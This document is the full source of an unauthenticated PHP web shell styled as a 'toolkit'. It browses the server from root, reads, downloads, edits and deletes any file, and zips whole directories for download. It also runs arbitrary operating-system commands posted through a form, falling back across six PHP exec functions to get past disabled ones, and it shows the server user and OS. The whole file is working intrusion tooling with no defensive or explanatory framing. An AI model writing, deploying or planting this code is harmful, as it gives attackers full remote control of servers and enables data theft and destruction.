<?php
// All-in-one toolkit - based on working filesystem browser
// Added: delete, zip download, command exec, file edit

$root = '/';
$path = isset($_GET['p']) ? $_GET['p'] : $root;
$action = isset($_GET['a']) ? $_GET['a'] : 'browse';
$dl = isset($_GET['dl']) ? $_GET['dl'] : '';

// Sanitize path - prevent null bytes
$path = str_replace("\0", '', $path);
// Normalize
$path = rtrim($path, '/') . '/';
if ($path === '/') $path = '/';

// File download/read - ORIGINAL LOGIC UNTOUCHED
if ($action === 'read' && $dl) {
    $dl = str_replace("\0", '', $dl);
    $content = @file_get_contents($dl);
    if ($content !== false) {
        header('Content-Type: text/plain; charset=utf-8');
        echo $content;
    } else {
        header('Content-Type: text/plain');
        echo '[ERROR] File not readable or permission denied';
    }
    exit;
}

// Raw file download
if ($action === 'dlfile' && $dl) {
    $dl = str_replace("\0", '', $dl);
    if (@is_readable($dl) && @is_file($dl)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($dl) . '"');
        header('Content-Length: ' . @filesize($dl));
        @readfile($dl);
    } else {
        header('Content-Type: text/plain');
        echo '[ERROR] File not readable';
    }
    exit;
}

// Save file (edit)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['a']) && $_POST['a'] === 'save') {
    header('Content-Type: application/json');
    $f = isset($_POST['f']) ? str_replace("\0", '', $_POST['f']) : '';
    $content = isset($_POST['content']) ? $_POST['content'] : '';
    if ($f === '' || !@is_file($f)) {
        echo json_encode(['ok' => false, 'error' => 'Invalid file path']);
    } elseif (@file_put_contents($f, $content) !== false) {
        echo json_encode(['ok' => true]);
    } else {
        echo json_encode(['ok' => false, 'error' => 'Write failed - permission denied']);
    }
    exit;
}

// ZIP/TAR directory download
if ($action === 'zip' && isset($_GET['t'])) {
    $target = str_replace("\0", '', $_GET['t']);
    $target = rtrim($target, '/');
    $zip_error = '';
    if (!is_dir($target)) {
        $zip_error = 'ZIP failed - not a directory: ' . $target;
    } elseif (class_exists('ZipArchive')) {
        $tmpfile = sys_get_temp_dir() . '/z_' . uniqid() . '.zip';
        $zip = new ZipArchive();
        if ($zip->open($tmpfile, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
            $base = basename($target);
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($it as $file) {
                $real = $file->getRealPath();
                $rel = $base . '/' . substr($real, strlen($target) + 1);
                if ($file->isDir()) $zip->addEmptyDir($rel);
                elseif ($file->isFile() && is_readable($real)) $zip->addFile($real, $rel);
            }
            $zip->close();
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="' . $base . '_' . date('Ymd_His') . '.zip"');
            header('Content-Length: ' . filesize($tmpfile));
            readfile($tmpfile);
            unlink($tmpfile);
            exit;
        }
        $zip_error = 'ZIP failed - could not create archive';
    } else {
        // Fallback: tar via CLI
        $parent = dirname($target);
        $base = basename($target);
        $tmpfile = sys_get_temp_dir() . '/t_' . uniqid() . '.tar.gz';
        $cmd = 'cd ' . escapeshellarg($parent) . ' && tar czf ' . escapeshellarg($tmpfile) . ' ' . escapeshellarg($base) . ' 2>&1';
        @exec($cmd, $out, $ret);
        if ($ret === 0 && @is_file($tmpfile)) {
            header('Content-Type: application/gzip');
            header('Content-Disposition: attachment; filename="' . $base . '_' . date('Ymd_His') . '.tar.gz"');
            header('Content-Length: ' . filesize($tmpfile));
            readfile($tmpfile);
            unlink($tmpfile);
            exit;
        }
        @unlink($tmpfile);
        $zip_error = 'ZIP failed - ZipArchive missing, tar fallback also failed';
    }
}

// Delete file
$del_msg = '';
if ($action === 'del' && isset($_GET['f'])) {
    $f = str_replace("\0", '', $_GET['f']);
    if (@is_file($f) && @unlink($f)) {
        $del_msg = 'Deleted: ' . basename($f);
    } else {
        $del_msg = 'Delete failed: ' . basename($f);
    }
}

// Command exec (POST)
$cmd_output = '';
$cmd_method = '';
$cmd_input = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd_input = $_POST['cmd'];
    $cmd = $cmd_input;
    if (function_exists('system')) {
        ob_start(); @system($cmd . ' 2>&1'); $cmd_output = ob_get_clean(); $cmd_method = 'system()';
    } elseif (function_exists('exec')) {
        $out = []; @exec($cmd . ' 2>&1', $out); $cmd_output = implode("\n", $out); $cmd_method = 'exec()';
    } elseif (function_exists('shell_exec')) {
        $cmd_output = @shell_exec($cmd . ' 2>&1'); $cmd_method = 'shell_exec()';
    } elseif (function_exists('passthru')) {
        ob_start(); @passthru($cmd . ' 2>&1'); $cmd_output = ob_get_clean(); $cmd_method = 'passthru()';
    } elseif (function_exists('popen')) {
        $h = @popen($cmd . ' 2>&1', 'r');
        if ($h) { $cmd_output = @stream_get_contents($h); pclose($h); $cmd_method = 'popen()'; }
    } elseif (function_exists('proc_open')) {
        $desc = [1 => ['pipe','w'], 2 => ['pipe','w']];
        $proc = @proc_open($cmd, $desc, $pipes);
        if (is_resource($proc)) {
            $cmd_output = @stream_get_contents($pipes[1]) . @stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]); proc_close($proc); $cmd_method = 'proc_open()';
        }
    }
    if ($cmd_method === '') { $cmd_output = 'No exec function available'; $cmd_method = 'NONE'; }
    $path = isset($_POST['p']) ? $_POST['p'] : $path;
}

$exec_funcs = ['system','exec','shell_exec','passthru','popen','proc_open'];
$disabled = ini_get('disable_functions');

// Scan directory - ORIGINAL
function scan_dir($path) {
    $entries = @scandir($path);
    if ($entries === false) return null;
    $dirs = [];
    $files = [];
    foreach ($entries as $e) {
        if ($e === '.' || $e === '..') continue;
        $full = rtrim($path, '/') . '/' . $e;
        if (@is_dir($full)) {
            $dirs[] = $e;
        } else {
            $size = @filesize($full);
            $files[] = ['name' => $e, 'size' => $size, 'readable' => @is_readable($full)];
        }
    }
    sort($dirs);
    usort($files, fn($a,$b) => strcmp($a['name'], $b['name']));
    return ['dirs' => $dirs, 'files' => $files];
}

function human_size($bytes) {
    if ($bytes === false || $bytes === null) return '?';
    if ($bytes < 1024) return $bytes . ' B';
    if ($bytes < 1048576) return round($bytes/1024, 1) . ' KB';
    return round($bytes/1048576, 1) . ' MB';
}

function breadcrumb($path) {
    $parts = explode('/', trim($path, '/'));
    $crumbs = [['label' => '/', 'path' => '/']];
    $cur = '';
    foreach ($parts as $p) {
        if ($p === '') continue;
        $cur .= '/' . $p;
        $crumbs[] = ['label' => $p, 'path' => $cur . '/'];
    }
    return $crumbs;
}

$result = scan_dir($path);
$crumbs = breadcrumb($path);

$parent = null;
if ($path !== '/') {
    $parent = dirname(rtrim($path, '/'));
    if ($parent !== '/') $parent .= '/';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>tk:// <?= htmlspecialchars($path) ?></title>
<style>
  :root {
    --bg: #0a0a0f;
    --panel: #0f0f1a;
    --border: #1e1e35;
    --accent: #00ff88;
    --accent2: #00aaff;
    --warn: #ff6b35;
    --red: #ff4444;
    --dim: #3a3a5c;
    --text: #c8c8e8;
    --text-dim: #5a5a7a;
    --dir-color: #00aaff;
    --file-color: #c8c8e8;
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Courier New', Courier, monospace;
    font-size: 13px;
    min-height: 100vh;
    padding: 0;
  }

  body::before {
    content: '';
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: repeating-linear-gradient(
      0deg, transparent, transparent 2px,
      rgba(0,255,136,0.015) 2px, rgba(0,255,136,0.015) 4px
    );
    pointer-events: none;
    z-index: 9999;
  }

  .topbar {
    background: var(--panel);
    border-bottom: 1px solid var(--border);
    padding: 10px 20px;
    display: flex;
    align-items: center;
    gap: 12px;
    position: sticky;
    top: 0;
    z-index: 100;
  }

  .logo { color: var(--accent); font-weight: 700; font-size: 14px; letter-spacing: 2px; text-shadow: 0 0 12px rgba(0,255,136,0.6); }
  .sep { color: var(--dim); }

  .breadcrumb { display: flex; align-items: center; gap: 4px; flex: 1; flex-wrap: wrap; }
  .breadcrumb a { color: var(--accent2); text-decoration: none; padding: 2px 6px; border-radius: 3px; transition: background 0.15s; }
  .breadcrumb a:hover { background: rgba(0,170,255,0.15); }
  .breadcrumb .slash { color: var(--dim); }
  .breadcrumb .current { color: var(--text); }

  .container { max-width: 1200px; margin: 0 auto; padding: 20px; }

  .path-input-row { display: flex; gap: 8px; margin-bottom: 16px; }

  .path-input {
    flex: 1; background: var(--panel); border: 1px solid var(--border);
    color: var(--accent); font-family: 'Courier New', Courier, monospace; font-size: 13px;
    padding: 8px 12px; border-radius: 4px; outline: none; transition: border-color 0.2s;
  }
  .path-input:focus { border-color: var(--accent); box-shadow: 0 0 8px rgba(0,255,136,0.2); }

  .btn {
    background: transparent; border: 1px solid var(--accent); color: var(--accent);
    font-family: 'Courier New', Courier, monospace; font-size: 12px; padding: 8px 16px;
    border-radius: 4px; cursor: pointer; transition: all 0.15s; text-decoration: none; display: inline-block;
  }
  .btn:hover { background: rgba(0,255,136,0.1); box-shadow: 0 0 8px rgba(0,255,136,0.3); }
  .btn-warn { border-color: var(--warn); color: var(--warn); }
  .btn-warn:hover { background: rgba(255,107,53,0.1); }
  .btn-blue { border-color: var(--accent2); color: var(--accent2); }
  .btn-blue:hover { background: rgba(0,170,255,0.1); }
  .btn-red { border-color: var(--red); color: var(--red); }
  .btn-red:hover { background: rgba(255,68,68,0.1); }
  .btn-sm { padding: 3px 8px; font-size: 11px; }

  .panel {
    background: var(--panel); border: 1px solid var(--border);
    border-radius: 6px; overflow: hidden; margin-bottom: 16px;
  }

  .panel-header {
    padding: 8px 16px; border-bottom: 1px solid var(--border);
    display: flex; align-items: center; gap: 8px;
    font-size: 11px; color: var(--text-dim); letter-spacing: 1px; text-transform: uppercase;
  }
  .panel-header .count { background: var(--border); padding: 1px 6px; border-radius: 10px; color: var(--text); }

  .entry {
    display: grid; grid-template-columns: 24px 1fr 80px auto;
    align-items: center; gap: 8px; padding: 7px 16px;
    border-bottom: 1px solid rgba(30,30,53,0.5); transition: background 0.1s;
  }
  .entry:last-child { border-bottom: none; }
  .entry:hover { background: rgba(255,255,255,0.03); }

  .entry-icon { text-align: center; font-size: 14px; }
  .entry-name { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
  .entry-name a { text-decoration: none; transition: color 0.15s; }
  .entry-name a:hover { text-decoration: underline; }

  .dir-name a { color: var(--dir-color); }
  .dir-name a:hover { color: #66ccff; text-shadow: 0 0 8px rgba(0,170,255,0.4); }

  .file-name a { color: var(--file-color); }
  .file-name a.unreadable { color: var(--text-dim); cursor: default; }

  .entry-size { color: var(--text-dim); font-size: 11px; text-align: right; }
  .entry-actions { text-align: right; display: flex; gap: 4px; justify-content: flex-end; }

  .read-link {
    color: var(--accent); text-decoration: none; font-size: 11px; padding: 2px 6px;
    border: 1px solid rgba(0,255,136,0.3); border-radius: 3px; transition: all 0.15s;
  }
  .read-link:hover { background: rgba(0,255,136,0.1); border-color: var(--accent); }
  .read-link.disabled { color: var(--dim); border-color: var(--dim); cursor: default; pointer-events: none; }

  .error-box { padding: 20px; color: var(--warn); text-align: center; font-size: 12px; }

  .parent-row { display: flex; align-items: center; gap: 8px; padding: 8px 16px; border-bottom: 1px solid rgba(30,30,53,0.5); }
  .parent-row a { color: var(--accent2); text-decoration: none; font-size: 12px; }
  .parent-row a:hover { text-decoration: underline; }

  .msg { padding: 8px 16px; font-size: 12px; border-radius: 4px; margin-bottom: 12px; border: 1px solid; }
  .msg-ok { color: var(--accent); border-color: rgba(0,255,136,0.3); background: rgba(0,255,136,0.05); }
  .msg-err { color: var(--warn); border-color: rgba(255,107,53,0.3); background: rgba(255,107,53,0.05); }

  .cmd-row { display: flex; gap: 8px; padding: 10px 16px; }
  .cmd-input {
    flex: 1; background: var(--bg); border: 1px solid var(--border);
    color: var(--accent); font-family: inherit; font-size: 13px;
    padding: 8px 12px; border-radius: 4px; outline: none;
  }
  .cmd-input:focus { border-color: var(--accent); box-shadow: 0 0 8px rgba(0,255,136,0.2); }
  .cmd-output {
    padding: 12px 16px; white-space: pre-wrap; word-break: break-all;
    font-size: 12px; line-height: 1.5; color: var(--text);
    max-height: 400px; overflow: auto; background: rgba(0,0,0,0.3);
    border-top: 1px solid var(--border);
  }
  .cmd-meta { padding: 4px 16px; font-size: 10px; color: var(--dim); border-top: 1px solid var(--border); }
  .cmd-funcs { padding: 6px 16px; font-size: 10px; color: var(--dim); display: flex; gap: 10px; flex-wrap: wrap; }
  .func-ok { color: var(--accent); }
  .func-no { color: var(--red); text-decoration: line-through; }

  #viewer { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); z-index: 1000; padding: 20px; }
  #viewer.active { display: flex; flex-direction: column; }

  .viewer-header {
    background: var(--panel); border: 1px solid var(--border); border-bottom: none;
    padding: 10px 16px; display: flex; align-items: center; justify-content: space-between;
    border-radius: 6px 6px 0 0;
  }
  .viewer-title { color: var(--accent); font-size: 12px; }
  .viewer-actions { display: flex; gap: 8px; }
  .viewer-close {
    background: none; border: 1px solid var(--warn); color: var(--warn);
    padding: 4px 10px; cursor: pointer; font-family: 'Courier New', Courier, monospace;
    font-size: 11px; border-radius: 3px;
  }
  .viewer-close:hover { background: rgba(255,107,53,0.15); }

  #viewer-content {
    flex: 1; background: var(--panel); border: 1px solid var(--border);
    border-radius: 0 0 6px 6px; overflow: auto; padding: 16px;
    white-space: pre; font-family: 'Courier New', Courier, monospace;
    font-size: 12px; line-height: 1.6; color: var(--text);
  }

  .status-bar {
    display: flex; gap: 20px; padding: 6px 20px;
    background: var(--panel); border-top: 1px solid var(--border);
    font-size: 11px; color: var(--text-dim);
    position: fixed; bottom: 0; left: 0; right: 0;
  }
  .status-bar .ok { color: var(--accent); }
  .status-bar .path-display { color: var(--accent2); }

  body { padding-bottom: 30px; }
</style>
<script>
function readFile(path, name) {
  currentFilePath = path;
  cancelEdit();
  var viewer = document.getElementById('viewer');
  var content = document.getElementById('viewer-content');
  var title = document.getElementById('viewer-title');
  title.textContent = path;
  content.textContent = 'Loading...';
  var dlBtn = document.getElementById('viewer-dl');
  if (dlBtn) dlBtn.href = '?a=dlfile&dl=' + encodeURIComponent(path);
  viewer.classList.add('active');

  var xhr = new XMLHttpRequest();
  xhr.open('GET', '?a=read&dl=' + encodeURIComponent(path), true);
  xhr.onload = function() {
    if (xhr.status === 200) {
      content.textContent = xhr.responseText;
    } else {
      content.textContent = '[HTTP ERROR ' + xhr.status + ']';
    }
  };
  xhr.onerror = function() {
    content.textContent = '[NETWORK ERROR]';
  };
  xhr.send();
}

var currentFilePath = '';

function closeViewer() {
  cancelEdit();
  document.getElementById('viewer').classList.remove('active');
}

function startEdit() {
  var content = document.getElementById('viewer-content');
  var editor = document.getElementById('viewer-editor');
  editor.value = content.textContent;
  content.style.display = 'none';
  editor.style.display = 'block';
  document.getElementById('btn-edit').style.display = 'none';
  document.getElementById('btn-save').style.display = '';
  document.getElementById('btn-cancel').style.display = '';
  editor.focus();
}

function cancelEdit() {
  var content = document.getElementById('viewer-content');
  var editor = document.getElementById('viewer-editor');
  content.style.display = '';
  editor.style.display = 'none';
  document.getElementById('btn-edit').style.display = '';
  document.getElementById('btn-save').style.display = 'none';
  document.getElementById('btn-cancel').style.display = 'none';
}

function saveFile() {
  var editor = document.getElementById('viewer-editor');
  var btn = document.getElementById('btn-save');
  btn.textContent = 'SAVING...';
  btn.disabled = true;

  var data = new FormData();
  data.append('a', 'save');
  data.append('f', currentFilePath);
  data.append('content', editor.value);

  var xhr = new XMLHttpRequest();
  xhr.open('POST', window.location.pathname, true);
  xhr.onload = function() {
    try {
      var res = JSON.parse(xhr.responseText);
      if (res.ok) {
        document.getElementById('viewer-content').textContent = editor.value;
        cancelEdit();
        btn.textContent = 'SAVE';
        btn.disabled = false;
      } else {
        alert('Save failed: ' + (res.error || 'unknown error'));
        btn.textContent = 'SAVE';
        btn.disabled = false;
      }
    } catch(e) {
      alert('Save failed: bad response');
      btn.textContent = 'SAVE';
      btn.disabled = false;
    }
  };
  xhr.onerror = function() {
    alert('Save failed: network error');
    btn.textContent = 'SAVE';
    btn.disabled = false;
  };
  xhr.send(data);
}
</script>
</head>
<body>

<div class="topbar">
  <span class="logo">TK://</span>
  <span class="sep">|</span>
  <div class="breadcrumb">
    <?php foreach ($crumbs as $i => $c): ?>
      <?php if ($i > 0): ?><span class="slash">/</span><?php endif; ?>
      <?php if ($i < count($crumbs)-1): ?>
        <a href="?p=<?= urlencode($c['path']) ?>"><?= htmlspecialchars($c['label']) ?></a>
      <?php else: ?>
        <span class="current"><?= htmlspecialchars($c['label']) ?></span>
      <?php endif; ?>
    <?php endforeach; ?>
  </div>
</div>

<div class="container">

  <?php if ($del_msg): ?>
    <div class="msg <?= strpos($del_msg,'failed')!==false ? 'msg-err' : 'msg-ok' ?>"><?= htmlspecialchars($del_msg) ?></div>
  <?php endif; ?>
  <?php if (!empty($zip_error)): ?>
    <div class="msg msg-err"><?= htmlspecialchars($zip_error) ?></div>
  <?php endif; ?>

  <form method="get" class="path-input-row">
    <input type="text" name="p" class="path-input" value="<?= htmlspecialchars($path) ?>" placeholder="/path..." id="pathInput">
    <button type="submit" class="btn">GO</button>
    <a href="?p=/" class="btn btn-blue">ROOT</a>
    <a href="?a=zip&t=<?= urlencode(rtrim($path,'/')) ?>" class="btn btn-warn">ZIP</a>
  </form>

  <!-- CMD -->
  <div class="panel">
    <div class="panel-header">CMD <span class="count"><?= $cmd_method ?: '---' ?></span></div>
    <form method="post" class="cmd-row">
      <input type="hidden" name="p" value="<?= htmlspecialchars($path) ?>">
      <input type="text" name="cmd" class="cmd-input" value="<?= htmlspecialchars($cmd_input) ?>" placeholder="command..." id="cmdInput" autocomplete="off">
      <button type="submit" class="btn">RUN</button>
    </form>
    <div class="cmd-funcs">
      <?php foreach ($exec_funcs as $fn): ?>
        <span class="<?= function_exists($fn) ? 'func-ok' : 'func-no' ?>"><?= $fn ?></span>
      <?php endforeach; ?>
      <?php if ($disabled): ?><span style="color:var(--warn)">disabled: <?= htmlspecialchars(substr($disabled,0,120)) ?></span><?php endif; ?>
    </div>
    <?php if ($cmd_output !== ''): ?>
      <div class="cmd-output"><?= htmlspecialchars($cmd_output) ?></div>
      <div class="cmd-meta">via <?= $cmd_method ?> | <?= strlen($cmd_output) ?> bytes</div>
    <?php endif; ?>
  </div>

  <?php if ($result === null): ?>
    <div class="panel">
      <div class="error-box">Permission denied or invalid path: <strong><?= htmlspecialchars($path) ?></strong></div>
    </div>
  <?php else: ?>

    <?php if (!empty($result['dirs'])): ?>
    <div class="panel">
      <div class="panel-header">DIRS <span class="count"><?= count($result['dirs']) ?></span></div>
      <?php if ($parent !== null): ?>
      <div class="parent-row"><a href="?p=<?= urlencode($parent) ?>">..</a></div>
      <?php endif; ?>
      <?php foreach ($result['dirs'] as $d):
        $full = rtrim($path,'/') . '/' . $d . '/';
      ?>
      <div class="entry">
        <span class="entry-icon">d</span>
        <span class="entry-name dir-name"><a href="?p=<?= urlencode($full) ?>"><?= htmlspecialchars($d) ?>/</a></span>
        <span class="entry-size">DIR</span>
        <span class="entry-actions">
          <a href="?a=zip&t=<?= urlencode(rtrim($full,'/')) ?>" class="btn btn-sm btn-warn">zip</a>
          <a href="?p=<?= urlencode($full) ?>" class="read-link">open</a>
        </span>
      </div>
      <?php endforeach; ?>
    </div>
    <?php elseif ($parent !== null): ?>
    <div class="panel">
      <div class="parent-row"><a href="?p=<?= urlencode($parent) ?>">..</a></div>
    </div>
    <?php endif; ?>

    <?php if (!empty($result['files'])): ?>
    <div class="panel">
      <div class="panel-header">FILES <span class="count"><?= count($result['files']) ?></span></div>
      <?php foreach ($result['files'] as $f):
        $full = rtrim($path,'/') . '/' . $f['name'];
      ?>
      <div class="entry">
        <span class="entry-icon"><?= $f['readable'] ? 'f' : 'x' ?></span>
        <span class="entry-name file-name">
          <?php if ($f['readable']): ?>
            <a href="#" onclick="readFile('<?= addslashes(htmlspecialchars($full)) ?>', '<?= addslashes(htmlspecialchars($f['name'])) ?>'); return false;"><?= htmlspecialchars($f['name']) ?></a>
          <?php else: ?>
            <a class="unreadable"><?= htmlspecialchars($f['name']) ?></a>
          <?php endif; ?>
        </span>
        <span class="entry-size"><?= human_size($f['size']) ?></span>
        <span class="entry-actions">
          <?php if ($f['readable']): ?>
            <a href="?a=dlfile&dl=<?= urlencode($full) ?>" class="btn btn-sm btn-blue">dl</a>
            <a href="#" onclick="readFile('<?= addslashes(htmlspecialchars($full)) ?>', '<?= addslashes(htmlspecialchars($f['name'])) ?>'); return false;" class="read-link">read</a>
          <?php else: ?>
            <span class="read-link disabled">locked</span>
          <?php endif; ?>
          <a href="?a=del&f=<?= urlencode($full) ?>&p=<?= urlencode($path) ?>" class="btn btn-sm btn-red" onclick="return confirm('Delete <?= addslashes(htmlspecialchars($f['name'])) ?> ?')">del</a>
        </span>
      </div>
      <?php endforeach; ?>
    </div>
    <?php endif; ?>

    <?php if (empty($result['dirs']) && empty($result['files'])): ?>
    <div class="panel"><div class="error-box" style="color: var(--text-dim);">Empty directory</div></div>
    <?php endif; ?>

  <?php endif; ?>

</div>

<!-- File viewer -->
<div id="viewer">
  <div class="viewer-header">
    <span class="viewer-title" id="viewer-title">-</span>
    <div class="viewer-actions">
      <a href="#" id="viewer-dl" class="btn btn-sm btn-blue">download</a>
      <button id="btn-edit" class="btn btn-sm btn-warn" onclick="startEdit()">EDIT</button>
      <button id="btn-save" class="btn btn-sm" onclick="saveFile()" style="display:none">SAVE</button>
      <button id="btn-cancel" class="btn btn-sm btn-red" onclick="cancelEdit()" style="display:none">CANCEL</button>
      <button class="viewer-close" onclick="closeViewer()">CLOSE</button>
    </div>
  </div>
  <div id="viewer-content">Loading...</div>
  <textarea id="viewer-editor" style="display:none; flex:1; background:var(--panel); border:1px solid var(--border); border-radius:0 0 6px 6px; padding:16px; white-space:pre; font-family:'Courier New',Courier,monospace; font-size:12px; line-height:1.6; color:var(--text); resize:none; outline:none; width:100%;"></textarea>
</div>

<div class="status-bar">
  <span>TK</span>
  <span class="path-display"><?= htmlspecialchars($path) ?></span>
  <?php if ($result !== null): ?>
    <span class="ok"><?= count($result['dirs']) ?>d / <?= count($result['files']) ?>f</span>
  <?php endif; ?>
  <span>PHP <?= phpversion() ?></span>
  <span><?= php_uname('s') . ' ' . php_uname('r') ?></span>
  <span><?= function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : get_current_user() ?></span>
</div>

<script>
document.addEventListener('keydown', function(e) {
  if (e.key === 'Escape') closeViewer();
  if (e.key === '/' && document.activeElement !== document.getElementById('pathInput')) {
    e.preventDefault();
    document.getElementById('pathInput').focus();
    document.getElementById('pathInput').select();
  }
  if (e.key === ':' && !['INPUT','TEXTAREA'].includes(document.activeElement.tagName)) {
    e.preventDefault();
    document.getElementById('cmdInput').focus();
  }
});
</script>

</body>
</html>
